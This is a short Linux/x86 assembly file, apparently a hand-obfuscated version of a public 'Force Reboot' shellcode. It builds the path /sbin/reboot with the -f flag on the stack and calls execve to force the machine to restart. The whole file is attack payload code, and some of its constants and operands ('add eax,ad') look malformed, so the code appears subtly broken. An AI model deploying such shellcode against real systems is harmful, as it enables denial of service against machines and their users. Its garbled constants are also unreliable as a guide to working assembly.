;http://shell-storm.org/shellcode/files/shellcode-831.php
;Linux/x86 Force Reboot shellcode 
;Little bit of polymorphism applied by me

section .text
		xor    eax,eax
		push   eax
		mov    dword eax,0x746F6FAC
		add    eax,0x4a
		push   eax
		mov    dword eax,0x65722EC1
		add    eax,ad
		push   eax
		push   0x6962732f
		mov    ebx,esp
		xor    eax,eax
		push   eax
		mov    word eax,0x662d
		push   eax
		mov    esi,esp
		xor    eax,eax
		push   eax
		push   esi	
		push   ebx
		mov    ecx,esp
		mov    al,0xd
		sub    al,0x2
		int    0x80

